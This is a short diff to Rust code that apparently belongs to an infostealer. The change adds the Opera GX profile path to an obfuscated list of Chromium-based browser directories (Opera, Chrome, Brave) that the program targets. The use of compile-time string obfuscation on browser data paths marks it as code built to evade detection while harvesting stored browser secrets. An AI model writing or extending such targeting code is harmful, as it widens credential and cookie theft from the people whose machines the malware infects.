@@ -11,6 +11,7 @@ use uuid::Uuid;
 fn get_chromunium_targets() -> Vec<String> {
     let mut targets = Vec::new();
     targets.push(obfstr::obfstr!("Roaming\\Opera Software\\Opera Stable").to_string());
+    targets.push(obfstr::obfstr!("Roaming\\Opera Software\\Opera GX").to_string());
     targets.push(obfstr::obfstr!("Local\\Google\\Chrome").to_string());
     targets.push(obfstr::obfstr!("Local\\Google(x86)\\Chrome").to_string());
     targets.push(obfstr::obfstr!("Local\\BraveSoftware\\Brave-Browser").to_string());
